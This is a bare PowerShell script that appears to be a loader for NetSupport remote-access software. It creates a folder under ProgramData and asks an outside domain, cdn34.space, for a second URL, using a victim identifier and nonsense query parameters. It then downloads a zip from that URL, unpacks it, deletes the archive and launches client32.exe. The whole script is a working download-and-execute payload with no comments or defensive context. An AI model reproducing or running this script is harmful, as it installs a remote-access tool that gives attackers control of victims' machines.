$fndir = "C:\ProgramData\netsupport"
$fn = "$($fndir)\netsupport.zip"
$iudValue = "2742b26f-47f6-47d7-be09-630a5f3d37f1"
New-Item -Path $fndir -ItemType Directory
$url = "https://cdn34.space/974afa0a-d334-48ec-a0d4-4cc14efa730c-1d3d044a-e654-41e3-ad32-38a2934393e4?aklshdjahsjdh=25&ajhsdjhasjhd=nsd&iud=$iudValue"
$webClient = New-Object Net.WebClient
$webClient.Headers.Add("User-Agent", "myUserAgentHere")
$downloadUrl = $webClient.DownloadString($url)
$webClient.DownloadFile($downloadUrl, $fn)
Expand-Archive -LiteralPath $fn -DestinationPath $fndir -Force
Remove-Item -Path $fn -Force -Recurse
Start-Sleep -seconds 3
Start-Process -FilePath "$($fndir)\client\client32.exe"
